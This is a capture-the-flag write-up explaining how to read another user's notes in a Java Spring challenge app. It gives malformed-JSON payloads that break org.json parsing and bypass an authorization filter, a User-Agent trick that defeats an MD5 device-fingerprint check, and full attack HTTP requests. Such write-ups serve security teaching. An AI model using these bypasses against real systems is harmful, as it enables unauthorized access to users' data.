Yet Another Notes Task
===
To get the flag, you need to exploit the IDOR vulnerability through the `userID` parameter.

```java
    @PostMapping(value = "/notes", produces = MediaType.APPLICATION_JSON_VALUE)
    public @ResponseBody NotesResponse notes(@RequestBody BaseRequest request) {
        NotesResponse response = new NotesResponse();
        User user = userDao.getUser(request.getUserID());
        if(user == null) {
            response.setResult("error");
            response.setError("Something wrong");
        } else {
            response.setResult("ok");
            response.setNotes(user.getNotes());
        }
        return response;
    }
```

To do this, you need to bypass the additional user ID matching check in the session and request parameters in the HttpFilter.

```java
    protected void doFilter(HttpServletRequest servletRequest, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException {
        MultiReadHttpServletRequest request = new MultiReadHttpServletRequest(servletRequest);
        RequestAttributes requestAttributes = RequestContextHolder.getRequestAttributes();
        Integer sessionUserID = (Integer)(requestAttributes.getAttribute("user_id", RequestAttributes.SCOPE_SESSION));
        Integer requestUserID = null;
        
        if (HttpMethod.POST.matches(request.getMethod())) {
            try {
                String body = request.getReader().lines().collect(Collectors.joining(System.lineSeparator()));
                JSONObject jsonObject = new JSONObject(body);
                requestUserID = jsonObject.getInt("userID");
            } catch (Exception e) {}
        }
        [...]
        if((sessionUserID != null) && ((requestUserID == null) || sessionUserID.equals(requestUserID))) {
            [...]
        } else {
            response.sendError(HttpServletResponse.SC_FORBIDDEN, "Unauthorized");
        }
    }
```

Thus, it is necessary to throw an Exception in the processing of the HTTP request body through the `org.json` library so that the `requestUserID` variable remains uninitialized. But the standard Spring HTTP request parser should return the correct value.

This can be done in several ways:
* Duplicate parameters with the same keys `{"userID":"1","x":"x","x":"x"}`
* Space after number `{"userID":"1 "}`
* Wrap HTTP request body in UTF-16 encoding

Additionally, you need to bypass the device fingerprint check.
```java
    String deviceFingerprint = Utils.getMd5(requestUserID, request.getHeader("User-Agent"), request.getRemoteAddr());
    if(sessionDao.isValidSession(deviceFingerprint, requestAttributes.getSessionId())) {
        filterChain.doFilter(request, response);
    } else {
        response.sendError(HttpServletResponse.SC_FORBIDDEN, "Unauthorized");
    }
    [...]   
    public static String getMd5(Object... args) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            for (Object arg : args) {
                if(arg != null)
                    md.update(String.valueOf(arg).getBytes());
            }
            byte[] digest = md.digest();
            String hash = DatatypeConverter.printHexBinary(digest).toLowerCase();
            return hash;
        } catch (NoSuchAlgorithmException ex) {
            return null;
        }
    }
```

Since the value of requestUserID is null, you must add the user ID to the beginning of the User-Agent header line.
```http
POST /signup HTTP/1.1
Host: yant.volgactf-task.ru
User-Agent: XXX
Content-Type: application/json
Content-Length: 47

{"username":"blahblah","password":"blahblah"}
```

```http
POST /notes HTTP/1.1
Host: yant.volgactf-task.ru
Cookie: JSESSIONID=<attacker-session-id>;
User-Agent: <attacker-user-id>XXX
Content-Type: application/json
Content-Length: 30

{"userID":"1","x":"x","x":"x"}
```
